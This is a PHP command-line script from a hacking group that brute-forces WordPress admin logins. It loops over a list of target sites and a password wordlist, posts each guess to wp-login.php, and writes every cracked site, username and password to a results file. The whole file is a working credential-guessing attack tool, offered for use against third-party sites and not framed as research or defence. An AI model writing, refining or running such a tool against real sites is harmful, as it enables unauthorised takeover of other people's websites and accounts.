<?php
print_r("\r\n\r\n
______            _          _    _               _
| ___ \          | |        | |  | |             | |
| |_/ /_ __ _   _| |_ ___   | |  | | ___  _ __ __| |_ __  _ __ ___  ___ ___
| ___ \ '__| | | | __/ _ \  | |/\| |/ _ \| '__/ _` | '_ \| '__/ _ \/ __/ __|
| |_/ / |  | |_| | ||  __/  \  /\  / (_) | | | (_| | |_) | | |  __/\__ \__ \
\____/|_|   \__,_|\__\___|   \/  \/ \___/|_|  \__,_| .__/|_|  \___||___/___/

[+]-------------------------------------------[+]
[+] Coder By : Lov3rDns                       [+]
[+] Title    : Brute Force Wordpress By x3    [+]
[+] Group    : x3                             [+]
[+] Homepage : is-sec.com - Groupx3.org       [+]
[+] 4U : Mr.Dm4r - xSecurity - Shark Hidden   [+]
[+]-------------------------------------------[+]
[*] Usage : php {$argv[0]} sites.txt admin pass.txt\r\n\r\n");

$sitel = $argv[1];
$username = $argv[2];
$passl = $argv[3];

$webs = explode("\n", file_get_contents($sitel));
$pass = explode("\n", file_get_contents($passl));

print "############ START BRUTING ############\r\n";
foreach($webs as $web)
{
$web = @trim($web);
print "[+] Target -> {$web}\r\n[+] Trying Passwords..\r\n";
foreach($pass as $password)
{
$password = @trim($password);
$x3 = brute($web,$username,$password);
if(eregi('upload.php', $x3))
{
print "[+] Site: {$web}\r\n[+] Username: {$username}\r\n[+] Password:  {$password}\r\n";
$f = fopen('result.txt', 'a+');
$source = "[+] Site: {$web}\r\n[+] Username: {$username}\r\n[+] Password: {$password}\r\n";
fwrite($f,$source);
}
}
}
print "############      END      ############\r\n";

function brute($web,$username,$password)
{
$curl = curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($curl,CURLOPT_POST,TRUE);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,TRUE);
curl_setopt($curl,CURLOPT_COOKIEJAR, getcwd()."./cookie.txt");
curl_setopt($curl,CURLOPT_COOKIEFILE, getcwd()."./cookie.txt");
curl_setopt($curl,CURLOPT_URL,"{$web}/wp-login.php");
curl_setopt($curl,CURLOPT_POSTFIELDS,"log={$username}&pwd={$password}&wp-submit=Log+In&redirect_to=./wp-admin/&testcookie=1");
$brute = curl_exec($curl);
return $brute;
}

print_r("\r\n\r\n
[+]-----------------------------------------------------------------[+]
            Brute Force Wordpress Command Line By x3
                       Coder By Lov3rDns
                  www.lov3rphp.wordpress.com
                             ./x3
[+]-----------------------------------------------------------------[+]
");
?>